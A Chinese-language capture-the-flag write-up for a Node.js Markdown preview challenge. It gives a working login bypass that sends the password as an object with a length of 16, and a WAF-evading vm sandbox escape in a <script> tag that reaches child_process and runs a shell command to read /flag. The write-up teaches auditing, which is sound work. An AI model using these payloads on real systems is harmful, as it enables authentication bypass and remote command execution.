# Markdown Online

## 题目简述

题目提供了一个 Node.js Markdown 在线预览服务。登录后提交的 Markdown 会先经过 `markdown-it` 渲染，再由 `zombie.js` 加载；后者会把页面中的 JavaScript 交给 Node.js 的 `vm` 模块执行。解题链由两个漏洞组成：利用登录逻辑中空的 `catch` 绕过口令校验，再借 Markdown 保留的 `<script>` 标签完成 `vm` 沙箱逃逸并读取 flag。

## 解题过程

登录控制器的关键逻辑可以整理为：

```javascript
function LoginController(req, res) {
  if (req.body.username === "admin" && req.body.password.length === 16) {
    try {
      req.body.password = req.body.password.toUpperCase()
      if (req.body.password !== "54gkj7n8uo55vbo2") {
        return res.status(403).json({msg: "invalid username or password"})
      }
    } catch (_) {}

    req.session["unique_id"] = randString.generate(16)
    res.json({msg: "ok"})
  } else {
    res.status(403).json({msg: "login failed"})
  }
}
```

`password` 不必是字符串，只需存在数值为 `16` 的 `length` 属性即可进入分支。将其传为普通对象后，`toUpperCase` 不存在，调用会抛出 `TypeError`；异常却被空 `catch` 吞掉，程序随后仍会创建会话。登录请求体应为：

```json
{
  "username": "admin",
  "password": {
    "length": 16
  }
}
```

官方 PDF 中这一示例把字段误写成了 `passowrd`；照抄会让 `req.body.password.length` 直接报错，正确字段必须是 `password`。

拿到会话后继续分析预览链。服务使用 `new MarkdownIt({html: true})`，因此 Markdown 内的原生 HTML 不会被转义。`SubmitController` 又依次执行 `waf(req.body.code)`、`md.render(code)` 和 `browser.load(source)`，最终使 `<script>` 中的代码进入 Node.js `vm`。

基础逃逸原语是：

```javascript
this.__proto__.constructor.constructor("return process")()
```

通过对象原型取得 `Function` 构造器后，新建函数可在沙箱外层取到 `process`，继而加载 `child_process`。题目 WAF 会拦截 `constructor`、`this`、`process` 以及 `+`，但没有禁用 `eval` 和 `String.prototype.concat`。可把敏感单词拆开，在运行时再拼接：

```html
<script>
const g = eval("th".concat("is"));
const c1 = g.__proto__["constru".concat("ctor")];
const c2 = c1["constru".concat("ctor")];
const outer = c2("return pro".concat("cess"))();
const cp = outer.mainModule.require("child_".concat("process"));
document.body.innerText = cp.execSync("cat /flag").toString();
</script>
```

提交后，脚本在预览进程内执行命令，并把 `/flag` 的内容写回页面；控制器返回渲染后的页面源码时即可读到 flag。若部署环境中的 flag 路径不同，只需把最后一条命令换成源码或容器配置中给出的实际路径。

## 方法总结

本题的关键不是单独找到一个 payload，而是串起两处边界错误。首先，输入类型没有被固定为字符串，且异常处理分支没有终止请求，使类型混淆直接变成认证绕过；其次，允许原生 HTML 的 Markdown 渲染器把攻击面传给了并非安全边界的 Node.js `vm`。审计类似服务时，应同时检查异常路径是否默认放行、JSON 字段类型是否验证，以及渲染后的 HTML 是否会在拥有高权限的浏览器或服务端 JavaScript 环境中执行。
